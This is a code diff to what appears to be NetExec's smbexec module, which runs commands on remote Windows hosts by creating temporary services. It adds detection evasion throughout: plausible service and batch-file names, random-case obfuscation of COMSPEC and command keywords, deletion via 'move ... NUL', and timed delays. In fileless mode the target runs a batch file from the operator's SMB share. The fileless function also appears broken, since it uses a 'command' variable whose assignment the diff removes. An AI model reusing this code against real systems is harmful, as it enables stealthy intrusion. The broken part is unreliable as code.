@@ -1,10 +1,17 @@
 import os
 from os.path import join as path_join
 from time import sleep
+from datetime import datetime
+import random
 from impacket.dcerpc.v5 import transport, scmr
-from nxc.helpers.misc import gen_random_string
+from nxc.helpers.misc import gen_random_string, PLAUSIBLE_SERVICE_NAMES, countdown_timer
 from nxc.paths import TMP_PATH
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
+
+
+def randomize_case(s):
+    """Randomizes the case of each character in a string."""
+    return "".join(random.choice([c.upper(), c.lower()]) for c in s)
 
 
 class SMBEXEC:
@@ -14,7 +21,12 @@ class SMBEXEC:
         self.__port = port
         self.__username = username
         self.__password = password
-        self.__serviceName = gen_random_string()
+
+        # Choose a random plausible name and append timestamp for the service name
+        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
+        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
+        self.__serviceName = f"{chosen_name}_{timestamp}"
+
         self.__domain = domain
         self.__lmhash = ""
         self.__nthash = ""
@@ -91,10 +103,34 @@ class SMBEXEC:
         self.__outputBuffer += data
 
     def execute_remote(self, data):
-        self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + ".bat"
+        # Generate output and batch file names based on plausible names and timestamp
+        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
+        # Added microseconds for higher uniqueness between calls
+        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
+        base_name = f"{chosen_name}_{timestamp}"
+        self.__output = f"{base_name}_out"
+        self.__batchFile = f"{base_name}_batch.bat"
 
-        command = self.__shell + "echo " + data + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
+        # Randomize COMSPEC capitalization for obfuscation
+        comspec_var = f"%{randomize_case('COMSPEC')}%".strip('%') # Remove % temporarily for f-string parsing
+        # Randomize other keywords, flags, and env vars
+        echo_cmd = randomize_case('echo')
+        del_cmd = randomize_case('del') # We'll replace this with move later, but keep randomization logic
+        move_cmd = randomize_case('move')
+        q_flag = randomize_case('/Q')
+        c_flag = randomize_case('/c')
+        localappdata_var = f"%{randomize_case('LOCALAPPDATA')}%".strip('%')
+        computername_var = f"%{randomize_case('COMPUTERNAME')}%".strip('%')
+
+        # Re-add % for the final command string
+        comspec_var = f'%{comspec_var}%'
+        localappdata_var = f'%{localappdata_var}%'
+        computername_var = f'%{computername_var}%'
+
+        # Use move /y ... NUL instead of del
+        delete_logic = f"{move_cmd} /y {localappdata_var}\\{self.__batchFile} NUL"
+
+        command = f"{comspec_var} {q_flag} {c_flag} {echo_cmd} {data} ^> \\\\{computername_var}\\{self.__share}\\{self.__output} 2^>^&1 > {localappdata_var}\\{self.__batchFile} & {comspec_var} {q_flag} {c_flag} {localappdata_var}\\{self.__batchFile} & {comspec_var} {q_flag} {c_flag} {delete_logic}" if self.__retOutput else f"{comspec_var} {q_flag} {c_flag} {data}"
 
         with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
             batch_file.write(command)
@@ -104,6 +140,11 @@ class SMBEXEC:
         self.logger.debug(f"Remote service {self.__serviceName} created.")
 
         try:
+            # Introduce delay before creating service
+            if not self.logger.args.no_delays:
+                self.logger.debug("Applying delay before creating service")
+                countdown_timer()
+            self.logger.debug(f"Creating remote service {self.__serviceName}")
             resp = scmr.hRCreateServiceW(
                 self.__scmr,
                 self.__scHandle,
@@ -122,13 +163,21 @@ class SMBEXEC:
             return self.__outputBuffer
 
         try:
-            self.logger.debug(f"Remote service {self.__serviceName} started.")
+            # Introduce delay before starting service
+            if not self.logger.args.no_delays:
+                self.logger.debug("Applying delay before starting service")
+                countdown_timer()
+            self.logger.debug(f"Starting remote service {self.__serviceName}")
             scmr.hRStartServiceW(self.__scmr, service)
         except Exception:
             pass
 
         try:
-            self.logger.debug(f"Remote service {self.__serviceName} deleted.")
+            # Introduce delay before deleting service
+            if not self.logger.args.no_delays:
+                self.logger.debug("Applying delay before deleting service")
+                countdown_timer()
+            self.logger.debug(f"Deleting remote service {self.__serviceName}")
             scmr.hRDeleteService(self.__scmr, service)
             scmr.hRCloseServiceHandle(self.__scmr, service)
         except Exception:
@@ -179,21 +228,37 @@ class SMBEXEC:
             pass
 
     def execute_fileless(self, data):
-        self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + ".bat"
+        # Generate output and batch file names based on plausible names and timestamp
+        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
+        # Added microseconds for higher uniqueness between calls
+        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
+        base_name = f"{chosen_name}_{timestamp}"
+        self.__output = f"{base_name}_out"
+        self.__batchFile = f"{base_name}_batch.bat"
+
+        # Randomize COMSPEC capitalization for obfuscation
+        comspec_var = f"%{randomize_case('COMSPEC')}%".strip('%') # Remove % temporarily for f-string parsing
+        # Randomize flags
+        q_flag = randomize_case('/Q')
+        c_flag = randomize_case('/c')
+        # Re-add % for the final command string
+        comspec_var = f'%{comspec_var}%'
+
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
-        command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else self.__shell + data
-
+        # Command written to the local batch file (uses echo)
+        local_batch_command = f"{comspec_var} {q_flag} {c_flag} {data} ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else f"{comspec_var} {q_flag} {c_flag} {data}"
         with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
-            batch_file.write(command)
+            batch_file.write(local_batch_command)
 
-        self.logger.debug("Hosting batch file with command: " + command)
-
-        command = self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
+        self.logger.debug("Hosting batch file with command: " + local_batch_command)
         self.logger.debug("Command to execute: " + command)
 
-        self.logger.debug(f"Remote service {self.__serviceName} created.")
+        # Introduce delay before creating service
+        if not self.logger.args.no_delays:
+            self.logger.debug("Applying delay before creating service")
+            countdown_timer()
+        self.logger.debug(f"Creating remote service {self.__serviceName}")
         resp = scmr.hRCreateServiceW(
             self.__scmr,
             self.__scHandle,
@@ -205,11 +270,19 @@ class SMBEXEC:
         service = resp["lpServiceHandle"]
 
         try:
-            self.logger.debug(f"Remote service {self.__serviceName} started.")
+            # Introduce delay before starting service
+            if not self.logger.args.no_delays:
+                self.logger.debug("Applying delay before starting service")
+                countdown_timer()
+            self.logger.debug(f"Starting remote service {self.__serviceName}")
             scmr.hRStartServiceW(self.__scmr, service)
         except Exception:
             pass
-        self.logger.debug(f"Remote service {self.__serviceName} deleted.")
+        # Introduce delay before deleting service
+        if not self.logger.args.no_delays:
+            self.logger.debug("Applying delay before deleting service")
+            countdown_timer()
+        self.logger.debug(f"Deleting remote service {self.__serviceName}")
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_fileless()
